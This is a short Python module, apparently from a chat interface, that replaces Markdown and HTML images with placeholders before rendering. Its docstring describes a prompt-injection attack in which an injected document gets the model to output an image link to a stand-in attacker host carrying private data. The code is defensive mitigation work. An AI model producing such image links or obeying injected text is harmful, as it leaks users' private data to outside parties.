"""Make chat text safe to render as Markdown.

A Markdown image makes the browser fetch its URL as soon as it is shown. If an
injected document convinces the model to output
``![](https://attacker.example/?q=<private data>)``, rendering it would send that
data to the attacker without a click. Chat text is therefore rendered with
every image replaced by a visible placeholder. Raw HTML is already escaped
because ``st.markdown`` is never called with ``unsafe_allow_html``.
"""

import re

# ![alt](url "title"), ![alt][ref], ![alt] and nested forms like [![alt](img)](link)
_MD_IMAGE = re.compile(r"!\[([^\]\n]*)\](?:\([^)\n]*\)|\[[^\]\n]*\])?")
_HTML_IMAGE = re.compile(r"<\s*img\b[^>]*>", re.IGNORECASE)


def _placeholder(match: re.Match[str]) -> str:
    alt = " ".join(match.group(1).split()).replace("[", "").replace("]", "")
    return f"\\[image removed: {alt}\\]" if alt else "\\[image removed\\]"


def without_images(text: str) -> str:
    """Replace Markdown and HTML images with escaped, non-loading placeholders."""
    text = _MD_IMAGE.sub(_placeholder, text)
    return _HTML_IMAGE.sub("\\[image removed\\]", text)
